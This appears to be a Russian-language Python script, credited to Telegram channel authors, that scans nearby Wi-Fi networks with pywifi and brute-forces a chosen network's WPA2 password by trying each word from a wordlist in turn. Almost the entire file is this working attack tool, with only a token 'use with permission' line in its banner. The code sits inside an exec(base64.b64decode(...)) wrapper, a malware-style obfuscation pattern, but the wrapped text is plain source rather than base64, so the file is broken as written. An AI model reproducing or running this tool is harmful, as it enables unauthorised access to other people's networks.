import base64;exec(base64.b64decode('import os
import time
import subprocess
import pywifi
from pywifi import const
import sys
import comtypes


def wiping():
    os.system('cls' if os.name == 'nt' else 'clear')

def create_gradient(text, start_rgb=(255, 140, 0), end_rgb=(148, 0, 211)):
    lines, result = text.splitlines(), []
    for line in lines:
        colored_line = ""
        if line.strip():
            length = len(line)
            for i, char in enumerate(line):
                ratio = i / max(1, length - 1)
                r = int(start_rgb[0] * (1 - ratio) + end_rgb[0] * ratio)
                g = int(start_rgb[1] * (1 - ratio) + end_rgb[1] * ratio)
                b = int(start_rgb[2] * (1 - ratio) + end_rgb[2] * ratio)
                colored_line += f"\033[38;2;{r};{g};{b}m{char}\033[0m"
        else:
            colored_line = line
        result.append(colored_line)
    return "\n".join(result)


def show_logo():
    banner = """
╔══════════════════════════════════════════════════════════════════════════╗
║                                                                          ║
║    ██████╗ ██████╗ ██╗   ██╗██╗  ██╗    ██╗    ██╗██╗███████╗██╗         ║
║    ██╔══██╗██╔══██╗██║   ██║██║  ██║    ██║    ██║██║██╔════╝██║         ║
║    ██████╔╝██████╔╝██║   ██║███████║    ██║ █╗ ██║██║█████╗  ██║         ║
║    ██╔══██╗██╔══██╗██║   ██║██╔══██║    ██║███╗██║██║██╔══╝  ██║         ║
║    ██████╔╝██║  ██║╚██████╔╝██║  ██║    ╚███╔███╔╝██║██║     ██║         ║
║    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝         ║
║                                                                          ║
║       Хакерская утилита для тестирования вай-фай сетей v1.4              ║
║       Используй только на своих сетях или с разрешения!                  ║
║       Разработчики: @FGBruh & @BruhYouTeeth | Канал: @FGIADV  саб плиз   ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝
    """
    print(create_gradient(banner))


def scan_wifi():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    iface.scan()
    time.sleep(2)

    nets = iface.scan_results()
    return nets


def show_nets(nets):
    if not nets:
        print("Не удалось. Чекни свой вай-фай адаптер.")
        return False

    print("\nДоступные точки доступа:")
    print(f"{'№':4} {'Имя сети':25} {'Сигнал':10} {'Защита'}")
    print("-" * 60)

    unique_nets = {}
    for i, net in enumerate(nets):
        if not net.ssid:
            continue

        if net.ssid not in unique_nets:
            unique_nets[net.ssid] = {
                'index': i + 1,
                'ssid': net.ssid,
                'signal': net.signal,
                'akm': net.akm
            }

    for i, (ssid, info) in enumerate(unique_nets.items()):
        security = "Открытая" if info['akm'] == const.AKM_TYPE_NONE else "Защищена"
        signal_strength = f"{info['signal']}%"
        print(f"{i + 1:<4} {info['ssid']:<25} {signal_strength:<10} {security}")

    return list(unique_nets.values())


def get_passes(wordlist_path):
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Ошибка: Словарь '{wordlist_path}' не найден. Проверь путь!")
        return None


def check_pass(iface, profile, password):
    profile.key = password
    iface.remove_all_network_profiles()
    temp_profile = iface.add_network_profile(profile)

    iface.connect(temp_profile)
    time.sleep(2)

    if iface.status() == const.IFACE_CONNECTED:
        return True
    else:
        return False


def crack(ssid, wordlist):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    total = len(wordlist)

    print(f"\nНачинаю брутфорс сети '{ssid}'...")
    print(f"Всего паролей на перебор: {total}")

    for i, pwd in enumerate(wordlist):
        if i % 10 == 0 or i == total - 1:
            progress = (i + 1) / total * 100
            print(f"\rПрогресс: [{i + 1}/{total}] {progress:.2f}% - Пробую: {pwd[:15]:<15}", end="")

        if check_pass(iface, profile, pwd):
            print(f"\n\nПАС НАЙДЕН! Пароль для '{ssid}': {pwd}")
            return True

    print(f"\n\nПас не найден в словаре для '{ssid}'. Попробуй другой словарь.")
    return False


def go():
    wordlist_path = "Bruh_wordlist.txt"

    while True:
        wiping()
        show_logo()

        print("\nВыбери что делать:")
        print("1. Просканить доступные вай-фай сети")
        print("2. Начать брутфорс с кастомными параметрами")
        print("3. Выйти")

        choice = input("\nВведи цифру (1-3): ")

        if choice == '1':
            print("\nСканирую эфир, погоди чутка...")
            nets = scan_wifi()
            net_info = show_nets(nets)

            if net_info:
                while True:
                    target = input("\nВыбери номер сети для взлома (0 для возврата в меню): ")

                    if target == '0':
                        break

                    try:
                        target_idx = int(target) - 1
                        if 0 <= target_idx < len(net_info):
                            selected = net_info[target_idx]

                            wordlist = get_passes(wordlist_path)
                            if wordlist:
                                crack(selected['ssid'], wordlist)
                                input("\nЖмакни Enter для продолжения...")
                                break
                        else:
                            print("Неправильный выбор, ты че?")
                    except ValueError:
                        print("Нужно число, а не вот это вот всё!")

            input("\nЖмакни Enter для продолжения...")

        elif choice == '2':
            ssid = input("\nВведи название вай-фай сети (SSID): ")

            wordlist = get_passes(wordlist_path)
            if wordlist and ssid:
                crack(ssid, wordlist)
                input("\nЖмакни Enter для продолжения...")

        elif choice == '3':
            print("\nЗакрываю прогу. Давай, до связи!")
            sys.exit(0)

        else:
            print("Нет такого варианта, ты что слепой?")
            time.sleep(1)


if __name__ == "__main__":
    try:
        import pywifi
    except ImportError:
        print("Не хватает библиотек. Установи пакеты командой:")
        print("pip install pywifi")
        sys.exit(1)

    go()').decode('utf-8'))